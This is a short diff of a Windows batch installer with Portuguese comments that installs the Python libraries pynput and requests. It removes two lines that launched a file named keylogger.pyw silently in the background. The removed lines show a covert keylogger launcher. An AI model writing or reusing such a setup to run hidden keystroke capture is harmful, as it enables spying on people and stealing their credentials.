@@ -7,7 +7,6 @@ if %errorlevel% == 0 (
   rem Instale as bibliotecas necessárias
   python -m pip install requests pynput
   rem Rode o script em um novo processo em segundo plano
-  start /b pythonw ./keylogger.pyw
   exit /b
 )
 
@@ -24,6 +23,3 @@ setx PATH "%PATH%;%ProgramFiles%\Python310\Scripts"
 
 rem Instale as bibliotecas necessárias
 python -m pip install requests pynput
-
-rem Rode o script em um novo processo em segundo plano
-start /b pythonw ./keylogger.pyw
